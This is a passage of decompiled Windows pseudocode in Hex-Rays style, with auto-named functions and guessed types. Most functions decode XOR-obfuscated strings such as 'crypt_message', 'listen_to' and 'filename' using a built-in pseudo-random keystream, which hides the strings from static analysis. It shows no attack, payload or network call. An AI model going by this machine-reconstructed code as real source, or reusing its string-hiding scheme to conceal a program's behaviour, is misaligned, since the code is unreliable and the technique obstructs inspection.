// 1400DC241: using guessed type char byte_1400DC241;
// 1400DC242: using guessed type char byte_1400DC242;
// 1400DC243: using guessed type char byte_1400DC243;
// 1400DC244: using guessed type char byte_1400DC244;

//----- (0000000140081940) ----------------------------------------------------
__int64 __fastcall sub_140081940(__int64 a1, const char *a2)
{
  __int64 v2; // rsi
  __int64 v3; // rax
  _QWORD *v4; // rax
  char *v5; // rbx
  char *v6; // rdi
  void *v8; // [rsp+38h] [rbp-80h]
  __int64 v9; // [rsp+48h] [rbp-70h]
  unsigned __int64 v10; // [rsp+50h] [rbp-68h]
  void *v11; // [rsp+60h] [rbp-58h]
  char *v12; // [rsp+68h] [rbp-50h]
  void *v13; // [rsp+78h] [rbp-40h]
  __int64 v14; // [rsp+88h] [rbp-30h]
  unsigned __int64 v15; // [rsp+90h] [rbp-28h]

  v2 = a1;
  v3 = sub_140081410((__int64)&v11, a2);
  v4 = sub_1400838D0(v3, &v8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140007990(v2, v4);
  if ( v10 >= 0x10 )
    operator delete(v8);
  v10 = 15i64;
  v9 = 0i64;
  LOBYTE(v8) = 0;
  if ( v15 >= 0x10 )
    operator delete(v13);
  v15 = 15i64;
  v14 = 0i64;
  LOBYTE(v13) = 0;
  v5 = (char *)v11;
  if ( v11 )
  {
    v6 = v12;
    if ( v11 != v12 )
    {
      do
      {
        sub_14000BD90((__int64)v5);
        v5 += 120;
      }
      while ( v5 != v6 );
      v5 = (char *)v11;
    }
    operator delete(v5);
  }
  return v2;
}
// 140007990: using guessed type __int64 __fastcall sub_140007990(_QWORD, _QWORD);

//----- (0000000140081A60) ----------------------------------------------------
void *__fastcall sub_140081A60(void *Src)
{
  void *v1; // rdi
  char *v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  char *v5; // rbx
  __int64 v6; // r14
  unsigned __int64 v7; // rax
  char *v8; // rsi
  __int64 v9; // rax
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  bool v12; // bl
  char *v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rcx
  char *v16; // rbx
  __int64 v17; // r14
  unsigned __int64 v18; // rax
  char *v19; // rsi
  __int64 v20; // rax
  _QWORD *v21; // rax
  char *v22; // rax
  __int64 v23; // rdx
  __int64 v24; // rcx
  char *v25; // rbx
  __int64 v26; // r14
  unsigned __int64 v27; // rax
  char *v28; // rsi
  __int64 v29; // rax
  _QWORD *v30; // rax
  char v32; // [rsp+Ch] [rbp-35h]
  void *v33; // [rsp+20h] [rbp-21h]
  __int64 v34; // [rsp+30h] [rbp-11h]
  unsigned __int64 v35; // [rsp+38h] [rbp-9h]
  void *Srca; // [rsp+40h] [rbp-1h]
  unsigned __int64 v37; // [rsp+58h] [rbp+17h]
  void *v38; // [rsp+60h] [rbp+1Fh]
  __int64 v39; // [rsp+70h] [rbp+2Fh]
  unsigned __int64 v40; // [rsp+78h] [rbp+37h]

  v1 = Src;
  v2 = (char *)sub_140081730(&v37);
  v5 = v2;
  v35 = 7i64;
  v34 = 0i64;
  LOWORD(v33) = 0;
  v6 = *((_QWORD *)v2 + 2);
  if ( v6 )
  {
    v7 = *((_QWORD *)v2 + 3);
    if ( v7 < 0x10 )
      v8 = v5;
    else
      v8 = *(char **)v5;
    if ( v7 >= 0x10 )
      v5 = *(char **)v5;
    v9 = sub_140031970(v4, v3);
    sub_140030C60(v5, &v8[v6], &v33, v9);
  }
  v10 = sub_14007A1A0();
  v11 = sub_140003DE0(&v38, v10, &v33);
  v12 = *sub_1400348D0(&v32, v11, 0i64) > 1u;
  if ( v40 >= 8 )
    operator delete(v38);
  v40 = 7i64;
  v39 = 0i64;
  LOWORD(v38) = 0;
  if ( v35 >= 8 )
    operator delete(v33);
  v35 = 7i64;
  v34 = 0i64;
  LOWORD(v33) = 0;
  if ( v37 >= 0x10 )
    operator delete(Srca);
  if ( v12 )
  {
    v13 = (char *)sub_140081730(&Srca);
    v16 = v13;
    v35 = 7i64;
    v34 = 0i64;
    LOWORD(v33) = 0;
    v17 = *((_QWORD *)v13 + 2);
    if ( v17 )
    {
      v18 = *((_QWORD *)v13 + 3);
      if ( v18 < 0x10 )
        v19 = v16;
      else
        v19 = *(char **)v16;
      if ( v18 >= 0x10 )
        v16 = *(char **)v16;
      v20 = sub_140031970(v15, v14);
      sub_140030C60(v16, &v19[v17], &v33, v20);
    }
    v21 = sub_14007A1A0();
    sub_140003DE0(v1, v21, &v33);
    if ( v35 >= 8 )
      operator delete(v33);
    v35 = 7i64;
    v34 = 0i64;
    LOWORD(v33) = 0;
  }
  else
  {
    v22 = (char *)sub_140081520(&Srca);
    v25 = v22;
    v35 = 7i64;
    v34 = 0i64;
    LOWORD(v33) = 0;
    v26 = *((_QWORD *)v22 + 2);
    if ( v26 )
    {
      v27 = *((_QWORD *)v22 + 3);
      if ( v27 < 0x10 )
        v28 = v25;
      else
        v28 = *(char **)v25;
      if ( v27 >= 0x10 )
        v25 = *(char **)v25;
      v29 = sub_140031970(v24, v23);
      sub_140030C60(v25, &v28[v26], &v33, v29);
    }
    v30 = sub_14007A1A0();
    sub_140003DE0(v1, v30, &v33);
    if ( v35 >= 8 )
      operator delete(v33);
    v35 = 7i64;
    v34 = 0i64;
    LOWORD(v33) = 0;
  }
  if ( v37 >= 0x10 )
    operator delete(Srca);
  return v1;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (0000000140081CE0) ----------------------------------------------------
_QWORD *__fastcall sub_140081CE0(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rsi
  _QWORD *i; // rdi

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 15 )
  {
    if ( v3 )
      sub_140081350(v3, i);
    v3 += 15;
  }
  return v3;
}

//----- (0000000140081E80) ----------------------------------------------------
unsigned __int64 __fastcall sub_140081E80(__int64 *a1, __int64 a2)
{
  size_t v2; // rdi
  const void **v3; // r14
  __int64 v5; // r13
  unsigned int v6; // ebp
  unsigned int v7; // esi
  unsigned __int64 v8; // r15
  unsigned __int64 v9; // r12
  __int64 v10; // rax
  _QWORD *v11; // rcx
  const void *v12; // rdx
  size_t v13; // rbx
  size_t v14; // r8
  int v15; // eax

  v2 = *(_QWORD *)(a2 + 16);
  v3 = (const void **)a2;
  if ( !v2 )
    return ((signed __int64)(a1[1]
                           - *a1
                           + ((unsigned __int128)((a1[1] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 6)
         + ((unsigned __int64)(a1[1]
                             - *a1
                             + ((unsigned __int128)((a1[1] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 63);
  v5 = *a1;
  v6 = 0;
  v7 = 0;
  v8 = ((unsigned __int64)(a1[1]
                         - *a1
                         + ((unsigned __int128)((a1[1] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
     + ((signed __int64)(a1[1]
                       - *a1
                       + ((unsigned __int128)((a1[1] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 6);
  if ( v8 )
  {
    v9 = *(_QWORD *)(a2 + 24);
    v10 = 0i64;
    while ( 1 )
    {
      v11 = (_QWORD *)(120 * v10 + v5 + 64);
      if ( v9 < 0x10 )
        v12 = v3;
      else
        v12 = *v3;
      v13 = v11[2];
      if ( v11[3] >= 0x10ui64 )
        v11 = (_QWORD *)*v11;
      v14 = v2;
      if ( v13 < v2 )
        v14 = v13;
      if ( v14 )
        v15 = memcmp(v11, v12, v14);
      else
        v15 = 0;
      if ( v15 )
        goto LABEL_18;
      if ( v13 >= v2 )
        break;
LABEL_20:
      v10 = ++v7;
      if ( v7 >= v8 )
        return v6;
    }
    LOBYTE(v15) = v13 != v2;
LABEL_18:
    if ( !v15 )
      ++v6;
    goto LABEL_20;
  }
  return v6;
}

//----- (0000000140081FB0) ----------------------------------------------------
_QWORD *__fastcall sub_140081FB0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC27C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC27C & 1 )
  {
    v5 = byte_1400DC278;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC27C | 1;
    dword_1400DC254 = v4;
    dword_1400DC27C |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC278 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC27C = v1 | 2;
    byte_1400DC280[0] = v5 ^ 0x63;
    byte_1400DC281 = (v5 - 1) ^ 0x6F;
    byte_1400DC282 = (v5 - 2) ^ 0x6E;
    byte_1400DC283 = (v5 - 3) ^ 0x74;
    byte_1400DC284 = (v5 - 4) ^ 0x65;
    byte_1400DC285 = (v5 - 5) ^ 0x78;
    byte_1400DC286 = (v5 - 6) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DC278;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC280[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC278: using guessed type char byte_1400DC278;
// 1400DC27C: using guessed type int dword_1400DC27C;
// 1400DC281: using guessed type char byte_1400DC281;
// 1400DC282: using guessed type char byte_1400DC282;
// 1400DC283: using guessed type char byte_1400DC283;
// 1400DC284: using guessed type char byte_1400DC284;
// 1400DC285: using guessed type char byte_1400DC285;
// 1400DC286: using guessed type char byte_1400DC286;

//----- (0000000140082180) ----------------------------------------------------
_QWORD *__fastcall sub_140082180(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC294;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC294 & 1 )
  {
    v5 = byte_1400DC292;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC294 | 1;
    dword_1400DC254 = v4;
    dword_1400DC294 |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC292 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC294 = v1 | 2;
    byte_1400DC298[0] = v5 ^ 0x63;
    byte_1400DC299 = (v5 - 1) ^ 0x72;
    byte_1400DC29A = (v5 - 2) ^ 0x79;
    byte_1400DC29B = (v5 - 3) ^ 0x70;
    byte_1400DC29C = (v5 - 4) ^ 0x74;
    byte_1400DC29D = (v5 - 5) ^ 0x5F;
    byte_1400DC29E = (v5 - 6) ^ 0x6D;
    byte_1400DC29F = (v5 - 7) ^ 0x65;
    byte_1400DC2A0 = (v5 - 8) ^ 0x73;
    byte_1400DC2A1 = (v5 - 9) ^ 0x73;
    byte_1400DC2A2 = (v5 - 10) ^ 0x61;
    byte_1400DC2A3 = (v5 - 11) ^ 0x67;
    byte_1400DC2A4 = (v5 - 12) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400DC292;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC298[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC292: using guessed type char byte_1400DC292;
// 1400DC294: using guessed type int dword_1400DC294;
// 1400DC299: using guessed type char byte_1400DC299;
// 1400DC29A: using guessed type char byte_1400DC29A;
// 1400DC29B: using guessed type char byte_1400DC29B;
// 1400DC29C: using guessed type char byte_1400DC29C;
// 1400DC29D: using guessed type char byte_1400DC29D;
// 1400DC29E: using guessed type char byte_1400DC29E;
// 1400DC29F: using guessed type char byte_1400DC29F;
// 1400DC2A0: using guessed type char byte_1400DC2A0;
// 1400DC2A1: using guessed type char byte_1400DC2A1;
// 1400DC2A2: using guessed type char byte_1400DC2A2;
// 1400DC2A3: using guessed type char byte_1400DC2A3;
// 1400DC2A4: using guessed type char byte_1400DC2A4;

//----- (0000000140082390) ----------------------------------------------------
_QWORD *__fastcall sub_140082390(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC26C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC26C & 1 )
  {
    v5 = byte_1400DC268;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC26C | 1;
    dword_1400DC254 = v4;
    dword_1400DC26C |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC268 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC26C = v1 | 2;
    byte_1400DC270[0] = v5 ^ 0x66;
    byte_1400DC271 = (v5 - 1) ^ 0x69;
    byte_1400DC272 = (v5 - 2) ^ 0x6C;
    byte_1400DC273 = (v5 - 3) ^ 0x65;
    byte_1400DC274 = (v5 - 4) ^ 0x6E;
    byte_1400DC275 = (v5 - 5) ^ 0x61;
    byte_1400DC276 = (v5 - 6) ^ 0x6D;
    byte_1400DC277 = (v5 - 7) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400DC268;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC270[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC268: using guessed type char byte_1400DC268;
// 1400DC26C: using guessed type int dword_1400DC26C;
// 1400DC271: using guessed type char byte_1400DC271;
// 1400DC272: using guessed type char byte_1400DC272;
// 1400DC273: using guessed type char byte_1400DC273;
// 1400DC274: using guessed type char byte_1400DC274;
// 1400DC275: using guessed type char byte_1400DC275;
// 1400DC276: using guessed type char byte_1400DC276;
// 1400DC277: using guessed type char byte_1400DC277;

//----- (0000000140082560) ----------------------------------------------------
_QWORD *__fastcall sub_140082560(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC2A8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC2A8 & 1 )
  {
    v5 = byte_1400DC2A5;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC2A8 | 1;
    dword_1400DC254 = v4;
    dword_1400DC2A8 |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC2A5 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC2A8 = v1 | 2;
    byte_1400DC2B0[0] = v5 ^ 0x6C;
    byte_1400DC2B1 = (v5 - 1) ^ 0x69;
    byte_1400DC2B2 = (v5 - 2) ^ 0x73;
    byte_1400DC2B3 = (v5 - 3) ^ 0x74;
    byte_1400DC2B4 = (v5 - 4) ^ 0x65;
    byte_1400DC2B5 = (v5 - 5) ^ 0x6E;
    byte_1400DC2B6 = (v5 - 6) ^ 0x5F;
    byte_1400DC2B7 = (v5 - 7) ^ 0x74;
    byte_1400DC2B8 = (v5 - 8) ^ 0x6F;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DC2A5;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC2B0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC2A5: using guessed type char byte_1400DC2A5;
// 1400DC2A8: using guessed type int dword_1400DC2A8;
// 1400DC2B1: using guessed type char byte_1400DC2B1;
// 1400DC2B2: using guessed type char byte_1400DC2B2;
// 1400DC2B3: using guessed type char byte_1400DC2B3;
// 1400DC2B4: using guessed type char byte_1400DC2B4;
// 1400DC2B5: using guessed type char byte_1400DC2B5;
// 1400DC2B6: using guessed type char byte_1400DC2B6;
// 1400DC2B7: using guessed type char byte_1400DC2B7;
// 1400DC2B8: using guessed type char byte_1400DC2B8;

//----- (0000000140082740) ----------------------------------------------------
_DWORD *__fastcall sub_140082740(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC260;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC260 & 1 )
  {
    v5 = byte_1400DC25D;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC260 | 1;
    dword_1400DC254 = v4;
    dword_1400DC260 |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC25D = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC260 = v1 | 2;
    byte_1400DC264[0] = v5 ^ 0x6E;
    byte_1400DC265 = (v5 - 1) ^ 0x61;
    byte_1400DC266 = (v5 - 2) ^ 0x6D;
    byte_1400DC267 = (v5 - 3) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
  {
    sub_140004790(Src, 4ui64, 0i64);
    v5 = byte_1400DC25D;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400DC264[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC25D: using guessed type char byte_1400DC25D;
// 1400DC260: using guessed type int dword_1400DC260;
// 1400DC265: using guessed type char byte_1400DC265;
// 1400DC266: using guessed type char byte_1400DC266;
// 1400DC267: using guessed type char byte_1400DC267;

//----- (00000001400828E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400828E0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC288;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC288 & 1 )
  {
    v5 = byte_1400DC287;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC288 | 1;
    dword_1400DC254 = v4;
    dword_1400DC288 |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC287 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC288 = v1 | 2;
    byte_1400DC28C[0] = v5 ^ 0x73;
    byte_1400DC28D = (v5 - 1) ^ 0x69;
    byte_1400DC28E = (v5 - 2) ^ 0x67;
    byte_1400DC28F = (v5 - 3) ^ 0x6E;
    byte_1400DC290 = (v5 - 4) ^ 0x65;
    byte_1400DC291 = (v5 - 5) ^ 0x64;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 6ui64 )
  {
    sub_140004790(Src, 6ui64, 0i64);
    v5 = byte_1400DC287;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 6i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 6) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC28C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 6 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC287: using guessed type char byte_1400DC287;
// 1400DC288: using guessed type int dword_1400DC288;
// 1400DC28D: using guessed type char byte_1400DC28D;
// 1400DC28E: using guessed type char byte_1400DC28E;
// 1400DC28F: using guessed type char byte_1400DC28F;
// 1400DC290: using guessed type char byte_1400DC290;
// 1400DC291: using guessed type char byte_1400DC291;

//----- (0000000140082AA0) ----------------------------------------------------
_QWORD *__fastcall sub_140082AA0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC2BC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC2BC & 1 )
  {
    v5 = byte_1400DC2B9;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC2BC | 1;
    dword_1400DC254 = v4;
    dword_1400DC2BC |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC2B9 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC2BC = v1 | 2;
    byte_1400DC2C0[0] = v5 ^ 0x70;
